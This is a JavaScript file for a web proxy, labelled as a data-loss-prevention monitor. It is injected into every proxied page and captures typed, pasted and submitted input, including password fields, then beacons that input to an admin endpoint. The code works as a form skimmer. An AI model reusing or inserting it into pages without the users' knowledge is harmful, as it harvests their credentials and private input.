/* ============================================================
   Input Monitor — captures user-typed values for DLP inspection.
   Injected alongside proxy.js into every proxied page.

   What it captures:
     • Input field values on blur (user finishes typing)
     • Textarea values on blur
     • Form submission field values
     • Paste events into inputs
     • contenteditable div text on blur

   Each capture is sent to /__admin__/dlp/input via a beacon
   (non-blocking POST) so it doesn't affect page performance.
   ============================================================ */
(function () {
  'use strict';

  const CAPTURE_ENDPOINT = '/__admin__/dlp/input';
  const DEBOUNCE_MS      = 500;

  // Track what we've already sent to avoid duplicates
  const sentValues = new WeakMap();

  function getFieldName(el) {
    return el.name || el.id || el.getAttribute('aria-label') ||
           el.getAttribute('placeholder') || el.type || 'unnamed';
  }

  function getFormAction(el) {
    const form = el.closest('form');
    return form ? (form.action || '') : '';
  }

  function sendCapture(field, value, inputType, formAction) {
    if (!value || value.trim().length === 0) return;

    // Don't re-send the same value for the same field
    const key = field + '::' + value;
    if (sendCapture._sent && sendCapture._sent.has(key)) return;
    if (!sendCapture._sent) sendCapture._sent = new Set();
    sendCapture._sent.add(key);

    // Limit set size to prevent memory leak
    if (sendCapture._sent.size > 5000) {
      sendCapture._sent = new Set([...sendCapture._sent].slice(-2000));
    }

    const payload = JSON.stringify({
      field,
      value,
      inputType: inputType || 'text',
      pageUrl: window.location.pathname,
      formAction,
      timestamp: new Date().toISOString(),
    });

    // Use sendBeacon for non-blocking delivery; fall back to fetch
    if (navigator.sendBeacon) {
      navigator.sendBeacon(CAPTURE_ENDPOINT, new Blob([payload], { type: 'application/json' }));
    } else {
      try {
        // Use the original fetch to avoid proxy rewriting
        const _f = window.__originalFetch || window.fetch;
        _f(CAPTURE_ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
          keepalive: true,
        }).catch(() => {});
      } catch (_) {}
    }
  }

  // ── Capture on blur (user leaves field after typing) ─────────
  function handleBlur(e) {
    const el = e.target;
    if (!el || !el.tagName) return;

    const tag = el.tagName.toLowerCase();
    if (tag === 'input') {
      const type = (el.type || 'text').toLowerCase();
      // Skip buttons, hidden, file inputs
      if (['button', 'submit', 'reset', 'hidden', 'file', 'image'].includes(type)) return;

      sendCapture(getFieldName(el), el.value, type, getFormAction(el));
    } else if (tag === 'textarea') {
      sendCapture(getFieldName(el), el.value, 'textarea', getFormAction(el));
    } else if (el.isContentEditable) {
      sendCapture(
        getFieldName(el) || 'contenteditable',
        el.textContent || el.innerText,
        'contenteditable',
        ''
      );
    }
  }

  // ── Capture on paste ─────────────────────────────────────────
  function handlePaste(e) {
    const el = e.target;
    if (!el || !el.tagName) return;
    const tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'textarea' && !el.isContentEditable) return;

    // Get pasted text from clipboard
    const pasted = (e.clipboardData || window.clipboardData);
    if (!pasted) return;
    const text = pasted.getData('text');
    if (text) {
      sendCapture(
        getFieldName(el) + ' [PASTE]',
        text,
        'paste',
        getFormAction(el)
      );
    }
  }

  // ── Capture on form submit ───────────────────────────────────
  function handleSubmit(e) {
    const form = e.target;
    if (!form || form.tagName.toLowerCase() !== 'form') return;

    const formData = new FormData(form);
    const action   = form.action || window.location.pathname;

    for (const [name, value] of formData.entries()) {
      if (typeof value === 'string' && value.length > 0) {
        sendCapture(name, value, 'form_submit', action);
      }
    }
  }

  // ── Attach listeners ─────────────────────────────────────────
  document.addEventListener('blur',   handleBlur,   true); // capture phase
  document.addEventListener('paste',  handlePaste,  true);
  document.addEventListener('submit', handleSubmit, true);

  // Also catch dynamically-added forms via MutationObserver
  // (SPAs create forms after initial load)

  console.log(
    '%c[DLP Monitor]%c Input capture active',
    'color:#f97316;font-weight:bold', 'color:inherit'
  );
})();
